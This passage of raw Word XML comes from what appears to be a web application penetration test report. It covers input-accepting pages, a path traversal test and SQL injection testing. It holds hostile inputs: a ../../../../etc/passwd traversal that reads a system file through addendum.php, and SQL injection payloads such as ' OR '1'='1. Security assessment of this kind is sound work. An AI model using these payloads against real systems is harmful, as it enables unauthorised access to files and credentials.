        <w:t>re all the users email add</w:t>
      </w:r>
      <w:r>
        <w:t>resses and within the Employee R</w:t>
      </w:r>
      <w:r w:rsidR="00C25217">
        <w:t>eport is all the employee usernames – including the admin usernames</w:t>
      </w:r>
      <w:r w:rsidR="00715727">
        <w:t>. This gives an attacker a big advantage as they now only need to crack the pas</w:t>
      </w:r>
      <w:r w:rsidR="00C25217">
        <w:t>sword to break into a customer or admins</w:t>
      </w:r>
      <w:r w:rsidR="00715727">
        <w:t xml:space="preserve"> account. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10FCD24F" w14:textId="072A270A" w:rsidR="006A428B" w:rsidRDefault="006A428B" w:rsidP="009035C2"/>
    <w:p w14:paraId="77286A18" w14:textId="07ABECE2" w:rsidR="006A428B" w:rsidRDefault="006A428B" w:rsidP="006A428B">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="30" w:name="_Toc531104349"/>
      <w:r>
        <w:t>Test for Input Based Vulnerabilities</w:t>
      </w:r>
      <w:bookmarkEnd w:id="30"/>
    </w:p>
    <w:p w14:paraId="25A75BA5" w14:textId="34E93C9D" w:rsidR="00F85CF1" w:rsidRDefault="00F85CF1" w:rsidP="00240031">
      <w:r>
        <w:t>In this section, common vulnerabilities within th</w:t>
      </w:r>
      <w:r w:rsidR="00C25217">
        <w:t>e application are searched for and</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> exploited. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D08174A" w14:textId="76CB7E18" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:r>
        <w:t xml:space="preserve">The pages that </w:t>
      </w:r>
      <w:r w:rsidR="00000FCE">
        <w:t>allow for user crafted input are</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A725948" w14:textId="7C76248C" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>userValidate.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5B650DA3" w14:textId="38F6C0FB" w:rsidR="00E60461" w:rsidRDefault="00E60461" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0FD81279" w14:textId="77777777" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006A428B">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006A428B">
        <w:t>updatepassword.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6F497469" w14:textId="77777777" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006A428B">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006A428B">
        <w:t>feedback_process.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7003D2C8" w14:textId="77777777" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006A428B">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006A428B">
        <w:t>cart_update.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5DBA3F8F" w14:textId="77777777" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006A428B">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006A428B">
        <w:t>InsertPayment.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4D25495C" w14:textId="77777777" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B85ED3">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B85ED3">
        <w:t>insertCustomer.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2A7C244B" w14:textId="77777777" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B85ED3">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B85ED3">
        <w:t>employeeValidate.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="77890ADD" w14:textId="77777777" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B85ED3">
        <w:t>/admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B85ED3">
        <w:t>searchware.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5F72B446" w14:textId="77777777" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B85ED3">
        <w:t>/admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B85ED3">
        <w:t>jointCustomer.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4E7AC229" w14:textId="77777777" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B85ED3">
        <w:t>/admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B85ED3">
        <w:t>insertProduct.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="56778BD7" w14:textId="1FFDD982" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B85ED3">
        <w:t>/admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B85ED3">
        <w:t>empRegistration.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="433C94FE" w14:textId="77777777" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B85ED3">
        <w:t>/admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B85ED3">
        <w:t>insertCategory.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="062C9E9B" w14:textId="77777777" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00452416">
        <w:t>/admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00452416">
        <w:t>insertWarehouse.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="78CD5AF9" w14:textId="77777777" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:r>
        <w:t>Among these pages, the secret cookie also submits data in the HTTP headers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AF629FB" w14:textId="77777777" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00240031"/>
    <w:p w14:paraId="17AC8944" w14:textId="6CAD1F16" w:rsidR="003A1187" w:rsidRDefault="00712913" w:rsidP="00712913">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="31" w:name="_Toc531104350"/>
      <w:r>
        <w:t>Test for Path Traversal</w:t>
      </w:r>
      <w:bookmarkEnd w:id="31"/>
    </w:p>
    <w:p w14:paraId="06920EC9" w14:textId="7E555E94" w:rsidR="00F33413" w:rsidRDefault="00712913" w:rsidP="00240031">
      <w:r>
        <w:t>To test for path traversal,</w:t>
      </w:r>
      <w:r w:rsidR="00C25217">
        <w:t xml:space="preserve"> a command line tool called</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>dotdotpwn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00000FCE">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00000FCE" w:rsidRPr="00000FCE">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00000FCE" w:rsidRPr="00000FCE">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>wireghoul</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00000FCE" w:rsidRPr="00000FCE">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00000FCE" w:rsidRPr="00000FCE">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>dotdotpwn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00000FCE" w:rsidRPr="00000FCE">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>, 2018)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> was used. The</w:t>
      </w:r>
      <w:r w:rsidR="00C25217">
        <w:t xml:space="preserve">re are </w:t>
      </w:r>
      <w:r w:rsidR="00000FCE">
        <w:t>four</w:t>
      </w:r>
      <w:r w:rsidR="00C25217">
        <w:t xml:space="preserve"> pages that use a parameter in the URL</w:t>
      </w:r>
      <w:r w:rsidR="00F85CF1">
        <w:t>. The terms and condition</w:t>
      </w:r>
      <w:r w:rsidR="00C565EC">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00F85CF1">
        <w:t xml:space="preserve"> page, the thank you page (found after submitting a contact us form)</w:t>
      </w:r>
      <w:r w:rsidR="00C565EC">
        <w:t>, the cart update function</w:t>
      </w:r>
      <w:r w:rsidR="00000FCE">
        <w:t xml:space="preserve"> and the profile update page</w:t>
      </w:r>
      <w:r w:rsidR="00F85CF1">
        <w:t xml:space="preserve">. The </w:t>
      </w:r>
      <w:r w:rsidR="00F85CF1" w:rsidRPr="00712913">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F85CF1" w:rsidRPr="00712913">
        <w:t>addendum.php?type</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F85CF1" w:rsidRPr="00712913">
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F85CF1" w:rsidRPr="00712913">
        <w:t>terms.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F85CF1">
        <w:t xml:space="preserve"> will be used to search for path traversal vulnerabilities</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>dotdotpwn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>, it was found that this webpage is vulnerable</w:t>
      </w:r>
      <w:r w:rsidR="00C25217">
        <w:t>, and the</w:t>
      </w:r>
      <w:r w:rsidR="004208DE">
        <w:t xml:space="preserve"> results can be seen in Figure 22</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22FBF0AA" w14:textId="77777777" w:rsidR="00712913" w:rsidRDefault="00712913" w:rsidP="00712913">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="69B3AA51" wp14:editId="448A792F">
            <wp:extent cx="5943600" cy="37014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01415"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EC7376C" w14:textId="0396679C" w:rsidR="00712913" w:rsidRDefault="00712913" w:rsidP="004208DE">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00D61A4D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>22</w:t>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="004208DE">
        <w:t xml:space="preserve"> - Path traversal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EB0F9BA" w14:textId="0DBF5976" w:rsidR="00712913" w:rsidRDefault="00712913" w:rsidP="00712913">
      <w:r>
        <w:t>Upon testing these results, the webpage was altered to display inform</w:t>
      </w:r>
      <w:r w:rsidR="004208DE">
        <w:t>ation about the webserver. In Figure 23</w:t>
      </w:r>
      <w:r>
        <w:t>, the results of the</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000C2BAB" w:rsidRPr="000C2BAB">
        <w:t>..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="000C2BAB" w:rsidRPr="000C2BAB">
        <w:t>/../../../</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000C2BAB" w:rsidRPr="000C2BAB">
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000C2BAB" w:rsidRPr="000C2BAB">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000C2BAB" w:rsidRPr="000C2BAB">
        <w:t>passwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000C2BAB">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">path traversal can be seen. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37A07CFA" w14:textId="77777777" w:rsidR="00712913" w:rsidRDefault="00712913" w:rsidP="00712913">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="17D65E80" wp14:editId="6C555DB1">
            <wp:extent cx="5943600" cy="725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725170"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="45D3C161" w14:textId="2C56A5BE" w:rsidR="00712913" w:rsidRDefault="00712913" w:rsidP="00712913">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00D61A4D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>23</w:t>
      </w:r>
      <w:r w:rsidR="00CE60F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="004C2771" w:rsidRPr="000C2BAB">
        <w:t>..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="004C2771" w:rsidRPr="000C2BAB">
        <w:t>/../../../</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="004C2771" w:rsidRPr="000C2BAB">
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004C2771" w:rsidRPr="000C2BAB">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="004C2771" w:rsidRPr="000C2BAB">
        <w:t>passwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1127D79A" w14:textId="4DE0F908" w:rsidR="00056157" w:rsidRDefault="000C2BAB" w:rsidP="00056157">
      <w:r>
        <w:t>This shows that the base directory is four directories backwards from the terms and condition page</w:t>
      </w:r>
      <w:r w:rsidR="004C2771">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="004208DE">
        <w:t xml:space="preserve"> This also proves that the application is vulnerable to path traversal, meaning that information contained</w:t>
      </w:r>
      <w:r w:rsidR="00E60461">
        <w:t xml:space="preserve"> within files can be </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00E60461">
        <w:t>discovered  and</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00E60461">
        <w:t xml:space="preserve"> displayed on the webpage.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C8D9213" w14:textId="55EE6E28" w:rsidR="00F85CF1" w:rsidRDefault="00056157" w:rsidP="00F85CF1">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="32" w:name="_Toc531104351"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Test for SQL Injection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="32"/>
    </w:p>
    <w:p w14:paraId="509B24F5" w14:textId="6F67A805" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00F85CF1">
      <w:r>
        <w:t>Burp intruder was used</w:t>
      </w:r>
      <w:r w:rsidR="004C2771">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>to test</w:t>
      </w:r>
      <w:r w:rsidR="004C2771">
        <w:t xml:space="preserve"> for SQL Injection vulnerabilities contained within all pages that allow user input</w:t>
      </w:r>
      <w:r>
        <w:t>. The payload</w:t>
      </w:r>
      <w:r w:rsidR="004208DE">
        <w:t>s used were</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C50B80B" w14:textId="77777777" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">‘;-- </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FB16EC3" w14:textId="77777777" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>‘ –</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14F316EB" w14:textId="77777777" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00056157">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>' OR '1'='1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="676E1B4C" w14:textId="5473857E" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00F85CF1">
      <w:r>
        <w:t>The pages that came back indicating that they may be vulnerable are as follow:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF96C61" w14:textId="77777777" w:rsidR="00D03EAD" w:rsidRPr="004C2771" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:keepNext/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="004C2771">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004C2771">
        <w:t>userValidate.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004C2771">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01BF93FE" w14:textId="77777777" w:rsidR="00D03EAD" w:rsidRPr="004C2771" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:keepNext/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="004C2771">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004C2771">
        <w:t>feedback_process.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004C2771">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9D2714" w14:textId="77777777" w:rsidR="00D03EAD" w:rsidRPr="004C2771" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:keepNext/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="004C2771">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004C2771">
        <w:t>InsertPayment.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004C2771">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F0FFC4" w14:textId="77777777" w:rsidR="00D03EAD" w:rsidRPr="004C2771" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="004C2771">
        <w:t>/admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004C2771">
        <w:t>empRegistration.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004C2771">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3890AFFC" w14:textId="77777777" w:rsidR="00D03EAD" w:rsidRDefault="00D03EAD" w:rsidP="00D03EAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B21C53">
        <w:t>/admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B21C53">
